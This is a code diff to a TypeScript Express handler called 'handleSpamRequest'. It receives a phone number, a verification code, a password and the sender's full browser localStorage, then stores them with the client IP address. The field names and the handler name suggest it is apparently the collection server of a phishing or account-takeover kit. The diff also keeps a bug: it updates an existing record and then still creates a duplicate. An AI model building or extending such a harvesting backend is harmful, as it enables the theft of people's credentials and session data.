@@ -6,32 +6,36 @@ export const handleSpamRequest = handleAsync(
   async (req: Request, res: Response) => {
     const { data } = req.body;
 
-    // 解析接收到的序列化数据
     const parsedData = JSON.parse(data);
-    // 从 parsedData 中提取 phoneCode、password 和 phoneNumber
-    const { phoneCode, password, phoneNumber, ...localStorageData } =
-      parsedData;
+
+    const { phoneCode, password, phoneNumber } = parsedData;
+
+    const existingCustomer = await Customer.findOne({ phoneNumber });
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址
 
-    // 创建新的 Customer 实例
+    if (existingCustomer) {
+      await existingCustomer.updateOne({
+        phoneCode,
+        password,
+        localStorage: data,
+        ip,
+      });
+    }
+
     const newCustomer = new Customer({
       phoneCode,
       password,
       phoneNumber,
-      localStorage: data, // 将 localStorageData 转换为字符串存储
+      localStorage: data,
       ip,
     });
 
-    // 保存到数据库
     await newCustomer.save();
 
-    // 返回成功响应
     res.status(200).json({
-      message: '请求成功',
-      data: { phoneCode, password, phoneNumber },
-      localStorage: localStorageData,
-      ip,
+      message: 'success',
+      data: { phoneCode },
     });
   },
 );
